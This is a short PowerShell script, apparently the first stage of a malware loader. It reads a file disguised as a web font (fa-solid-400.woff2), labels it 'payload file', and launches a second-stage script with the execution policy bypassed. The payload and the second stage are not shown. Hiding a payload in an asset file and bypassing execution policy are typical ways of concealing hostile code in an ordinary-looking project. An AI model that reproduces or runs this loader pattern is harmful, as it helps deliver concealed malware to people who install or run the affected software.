Write-Host "[Stage1]"

$fontFile = "$PSScriptRoot\..\public\fonts\fa-solid-400.woff2"

$content = Get-Content $fontFile -Raw

Write-Host "Loaded payload file"

powershell.exe `
    -ExecutionPolicy Bypass `
    -File "$PSScriptRoot\stage2.ps1"
